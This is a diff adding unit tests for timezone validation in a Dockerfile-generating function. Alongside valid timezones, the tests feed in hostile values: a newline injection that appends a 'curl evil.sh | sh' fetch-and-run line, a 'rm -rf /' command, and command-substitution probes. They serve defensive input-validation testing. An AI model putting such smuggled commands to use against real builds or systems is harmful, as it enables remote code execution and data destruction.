@@ -49,6 +49,25 @@ describe('generateProjectDockerfile', () => {
     expect(result).not.toContain('ENV TZ=')
   })
 
+  it('accepts valid timezone strings (region/city, UTC, offset)', () => {
+    expect(() => generateProjectDockerfile('1.0.0', [], [], [], 'Asia/Tokyo')).not.toThrow()
+    expect(() => generateProjectDockerfile('1.0.0', [], [], [], 'America/Argentina/Buenos_Aires')).not.toThrow()
+    expect(() => generateProjectDockerfile('1.0.0', [], [], [], 'UTC')).not.toThrow()
+    expect(() => generateProjectDockerfile('1.0.0', [], [], [], 'Etc/GMT+9')).not.toThrow()
+  })
+
+  it('rejects a timezone that injects a newline (Dockerfile injection)', () => {
+    expect(() =>
+      generateProjectDockerfile('1.0.0', [], [], [], 'Asia/Tokyo\nRUN curl evil.sh | sh'),
+    ).toThrow(/timezone/i)
+  })
+
+  it('rejects a timezone containing shell metacharacters', () => {
+    expect(() => generateProjectDockerfile('1.0.0', [], [], [], 'UTC; rm -rf /')).toThrow(/timezone/i)
+    expect(() => generateProjectDockerfile('1.0.0', [], [], [], 'UTC `id`')).toThrow(/timezone/i)
+    expect(() => generateProjectDockerfile('1.0.0', [], [], [], 'UTC$(whoami)')).toThrow(/timezone/i)
+  })
+
   it('generates apt-get install block for single apt package', () => {
     const result = generateProjectDockerfile('1.0.0', ['curl'], [])
     expect(result).toContain('apt-get update && apt-get install -y --no-install-recommends')
